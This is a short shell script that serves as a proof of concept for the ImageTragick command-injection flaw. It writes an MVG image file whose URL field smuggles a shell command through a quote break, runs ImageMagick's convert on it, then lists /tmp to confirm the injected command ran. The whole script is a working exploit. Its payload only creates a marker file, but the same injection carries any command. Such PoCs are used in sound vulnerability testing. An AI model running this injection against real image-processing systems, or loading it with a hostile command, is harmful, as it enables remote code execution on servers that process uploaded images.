#!/bin/sh
echo "viewbox 0 0 1 1 image over 0,0 0,0 'https://example.com/\" && touch /tmp/ImageTragick && echo \"1'" > poc.mvg
convert poc.mvg poc.png
ls -lah /tmp/
